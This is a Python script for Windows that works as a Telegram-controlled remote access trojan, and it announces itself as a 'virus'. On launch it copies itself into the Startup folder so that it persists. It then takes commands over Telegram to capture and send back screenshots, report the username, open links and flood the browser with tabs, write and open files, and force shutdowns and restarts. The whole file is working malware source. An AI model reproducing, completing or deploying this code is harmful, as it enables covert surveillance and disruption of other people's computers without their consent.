import time
from winreg import *
import telebot
import getpass
import os, sys
import webbrowser
from telebot import types
import win10toast 
import pyglet
import pyautogui

Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя
if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
         os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
         print(f'{Thisfile_name} virus installed!')

###################################################################################################################################################################################################
user = getpass.getuser()
bot = telebot.TeleBot('token')
help = "rsm user mytext link 10 1000 shutdown c "
helpc = ''
link = ''
timeshutdown = None
text =''
src = ''
###################################################################################################################################################################################################

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text == "kill":
        print('d')
    if message.text == "rsm":
         shutdown_msg()
    if message.text == "help":
         bot.send_message(message.from_user.id,help)
    if message.text == "helpc":
         bot.send_message(message.from_user.id,helpc)
    if message.text == "user":
        bot.send_message(message.from_user.id, user)
    if message.text == "mytext":
       bot.send_message(message.from_user.id, "Your text:")
       bot.register_next_step_handler(message, get_name)
    if message.text == "link":
        bot.send_message(message.from_user.id,"Your link:")
        bot.register_next_step_handler(message, get_link)
    if message.text == "10":
        web_10()
    if message.text == "1000":
        bsod()
    if message.text == "shutdown":
        sht()
    if message.text == "rs":
        os.system("shutdown.exe /f")
    if message.text == "c":
        bot.send_message(message.from_user.id, "chose command!")
        keyboard = types.InlineKeyboardMarkup()
        key_telec = types.InlineKeyboardButton(text='Shutdown', callback_data='shutdown')
        keyboard.add(key_telec)
        radicalshutdown = types.InlineKeyboardButton(text='radicalshutdown', callback_data='radicalshutdown')
        keyboard.add(radicalshutdown)
        sleep = types.InlineKeyboardButton(text='sleep', callback_data='sleep')
        keyboard.add(sleep)
        restart= types.InlineKeyboardButton(text='restart', callback_data='restart')
        keyboard.add(restart)
        closeapp= types.InlineKeyboardButton(text='shutdown user', callback_data='closeapp')
        keyboard.add(closeapp)
        screenshot= types.InlineKeyboardButton(text='screenshot', callback_data='scr')
        keyboard.add(screenshot)
        bot.send_message(message.from_user.id, text='buttons:', reply_markup=keyboard)
@bot.message_handler(content_types=['photo'])
def handle_docs_photo(message):
  try:
    file_info = bot.get_file(message.photo[0].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    src = 'C:/Users/'+user+'/Documents/' + message.photo[0].file_id+'.png'
    with open(src, 'wb') as new_file:
      new_file.write(downloaded_file)
    bot.send_message(message.chat.id,src)
    bot.reply_to(message, "Save and open")
    os.system("start "+src)
  except Exception as e:
       bot.reply_to(message,         
             e)
@bot.message_handler(content_types=['NoneType'])
###################################################################################################################################################################################################
def get_name(message):
    global text
    text = message.text
    bot.send_message(message.from_user.id, 'saved')
    f1 = open('C:/Users/'+user+'/Documents/F.txt', 'a+')
    f1.write(text)
    f1.close()
    myfile_path = r'C:/Users/'+user+'/Documents/F.txt'
    os.system("start "+myfile_path)
    bot.send_message(message.from_user.id,"open")
    os.system(r'nul>C:/Users/'+user+'/Documents/F.txt')
    bot.send_message(message.from_user.id,"clear")
    # keyboard = types.InlineKeyboardMarkup()
    # key_lev = types.InlineKeyboardButton(text='mytextopen', callback_data='text_a+')
    # keyboard.add(key_lev)
    # bot.send_message(message.from_user.id,text = 'clicker sur le bouton pour afficher',reply_markup=keyboard)
def get_link(message):
    global link
    link =message.text
    bot.send_message(message.from_user.id, 'link saved')
    webbrowser.open_new(link)
    # keyboard = types.InlineKeyboardMarkup()
    # get_link_pc = types.InlineKeyboardButton(text='openlink', callback_data='openlink')
    # keyboard.add(get_link_pc)
    # bot.send_message(message.from_user.id, text='clicker sur le bouton pour afficher', reply_markup=keyboard)
def web_10():
    for i in range (10):
      webbrowser.open_new('google.com')
def bsod():
    for i in range (1000):
      webbrowser.open_new('google.com')
def sht():
    os.system("shutdown /p")
def shutdown_msg():
    toaster = win10toast.ToastNotifier()
    toaster.show_toast("Systeme", "Device usage time will end in 1 minute")
    time.sleep(60)
    os.system("shutdown /p")
###################################################################################################################################################################################################


@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    if call.data == "radicalshutdown":
        os.system("shutdown /p")
    if call.data == "scr":
        screen = pyautogui.screenshot('C:/Users/'+user+'/Documents/screenshot.png')
        bot.send_photo(call.message.chat.id, photo=open('C:/Users/'+user+'/Documents/screenshot.png', 'rb'))
        os.remove('C:/Users/'+user+'/Documents/screenshot.png')
    if call.data == "shutdowntime":
        os.system("shutdown /s /t"+timeshutdown)
    if call.data == "sleep":
       os.system("shutdown.exe /h")
    if call.data == "restart":
       os.system("shutdown.exe /r")
    if call.data == "openlink":
       webbrowser.open_new(link)
    if call.data == "closeapp":
       os.system("shutdown.exe /f")
    if call.data == "text_a+":
        f1 = open('C:/Users/'+user+'/Documents/F.txt', 'a+')
        f1.write(text)
        f1.close()
        myfile_path = r'C:/Users/'+user+'/Documents/F.txt'
        os.system("start "+myfile_path)
        bot.send_message(call.message.chat.id,"your text file open")
        os.system(r'nul>C:/Users/'+user+'/Documents/F.txt')
        bot.send_message(call.message.chat.id,"your text file clear")

###################################################################################################################################################################################################
bot.polling(none_stop=True)